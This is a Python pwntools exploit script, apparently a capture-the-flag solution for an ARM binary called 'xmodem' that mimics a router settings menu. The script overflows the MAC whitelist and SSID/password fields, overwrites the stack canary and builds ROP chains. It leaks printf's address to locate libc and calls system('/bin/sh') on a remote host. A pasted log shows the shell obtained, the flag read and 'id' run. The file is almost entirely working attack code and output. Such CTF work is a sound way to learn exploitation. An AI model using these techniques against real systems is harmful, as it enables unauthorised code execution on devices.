from pwn import *
import time
import sys

def chall(DEBUG):
	if DEBUG=="1":
		r = process("./chall")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '42.117.243.201'
		PORT = 9999
		r = remote(HOST,PORT)
	
	def pause():
		# raw_input("?")
		time.sleep(0.1)
	
	def Login(username, password):
		r.sendline("1")
		r.recvuntil("User name: ")
		r.send(username)
		pause()
		r.recvuntil("Password: ")
		r.send(password)
	
	def AddWhiteListMac(mac):
		r.sendline("3")
		r.recvuntil("MAC address: ")
		r.sendline(mac)
		return r.recvuntil("Your choice: ")
		
	def SetSSID(ssid):
		r.sendline("5")
		r.recvuntil("New SSID: ")
		r.send(ssid)
		return r.recvuntil("Your choice: ")
	
	def SetWirelessPassword(password):
		r.sendline("6")
		r.recvuntil("New Wireless Password: ")
		r.send(password)
		return r.recvuntil("Your choice: ")
	
	offset_system = 0x2c780
	offset_printf = 0x36fb4
	offset_sh = 0xca3e3
	BSS = 0x22500
	gadget = 0x000108ac # pop {r0, r1, r4, r8, fp, ip, sp, pc}
	MACLIST = 0x2204c
	SSID = 0x22008 
	readStr = 0x108c4
	read_plt = 0x1070c
	printf_got = 0x21fa8
	puts_plt = 0x10754
	r.recvuntil("Your choice: ")
	Login("root\x00", "\x00")
	r.recvuntil("Your choice: ")
	payload = "F"*17
	AddWhiteListMac(payload)
	AddWhiteListMac(payload)
	AddWhiteListMac(payload)
	AddWhiteListMac("12"+p32(0xffffffff-1))
	AddWhiteListMac("F"*12+"\x00"*5+"XX"+"F"*5) # overwrite canary
	payload = p32(BSS) # r7
	payload += p32(gadget) # pc
	payload += p32(MACLIST) # r0
	payload += p32(0x100) # r1
	payload += "1111"
	SetSSID(payload)
	payload = "1111" # r8
	payload += "1111" # fp
	payload += "1111" # ip
	payload += p32(SSID+0x50) # sp
	payload += p32(readStr+1) # pc
	SetWirelessPassword(payload)
	password = "B"*0x28+"F"*4
	password += "C"*4
	password += "1111" # r4
	password += p32(SSID) # r7
	password += "\x61\x0e"
	Login("\n", password)
	r.recvuntil("Wrong username or password!")
	pause()
	payload = "A"*4
	payload += p32(SSID+0x70) # r7
	payload += p32(gadget) # pc
	payload += p32(printf_got) # r0
	payload += p32(printf_got) # r1
	payload += p32(printf_got) # r4
	payload += p32(printf_got) # r8
	payload += p32(printf_got) # fp
	payload += p32(printf_got) # ip
	payload += p32(BSS) # sp
	payload += p32(puts_plt) # pc
	payload += "X"*4
	payload += p32(SSID)
	payload += "Z"*4
	payload += "A"*4
	payload += p32(SSID+0x70) # r7
	payload += p32(gadget) # pc
	payload += p32(0x224f8) # r0
	payload += p32(0x100) # r1
	payload += p32(printf_got) # r4
	payload += p32(printf_got) # r8
	payload += p32(printf_got) # fp
	payload += p32(printf_got) # ip
	payload += p32(BSS) # sp
	payload += p32(readStr+1) # pc
	payload = payload.ljust(0x9f,"X")
	r.sendline(payload)
	
	printf = u32(r.recv(4))
	libc = printf - offset_printf
	system = libc + offset_system
	sh = libc + offset_sh
	log.info("libc: %#x" % libc)
	log.info("printf: %#x" % printf)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)
	payload = p32(SSID+0x70) # r7
	payload += p32(gadget) # pc
	payload += p32(sh) # r0
	payload += p32(0x100) # r1
	payload += p32(printf_got) # r4
	payload += p32(printf_got) # r8
	payload += p32(printf_got) # fp
	payload += p32(printf_got) # ip
	payload += p32(BSS) # sp
	payload += p32(system) # pc
	r.sendline(payload)
	r.interactive()

chall(sys.argv[1])

"""
$ python xmodem.py 2
[+] Opening connection to 42.117.243.201 on port 9999: Done
[*] libc: 0x76e11001
[*] printf: 0x76e47fb5
[*] system: 0x76e3d781
[*] sh: 0x76edb3e4
[*] Switching to interactive mode
x�v$  
$ cd /home/xmodem
$ cat flag
matesctf{xmodem_ma_de^_in_VietNam}
$ id
uid=1004(xmodem) gid=1004(xmodem) groups=1004(xmodem)
$  
"""